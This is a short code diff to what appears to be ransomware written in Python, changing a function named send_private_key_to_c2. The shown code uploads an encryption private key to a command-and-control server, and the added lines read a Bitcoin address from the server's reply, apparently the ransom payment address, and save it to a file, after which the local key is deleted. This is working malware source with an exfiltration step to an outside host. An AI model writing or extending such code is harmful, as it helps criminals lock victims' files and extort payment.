@@ -2,6 +2,7 @@ import requests
 import os
 import gc
 import socket
+import json
 import uuid
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.backends import default_backend
@@ -27,7 +28,16 @@ def send_private_key_to_c2(private_key):
         response = requests.post(c2_server + "/upload_key", files=files)
         
         if response.status_code == 200:
-            print(f"Sent private key: {renamed_key}") # Debug Message
+            data = response.json()
+            btc_address = data.get('btc_address', None)
+            if btc_address:
+                print(f"BTC Address received: {btc_address}")  # Debug Message
+                with open("response_data.json", "w") as json_file: # Dumping the response into a json file so i can use it later
+                    json.dump(data, json_file, indent=4)
+            else:
+                print("BTC address not found in the response.")
+
+            print(f"Sent private key: {renamed_key}")  # Debug Message
 
             # Delete private key from memory and system
             private_key = None
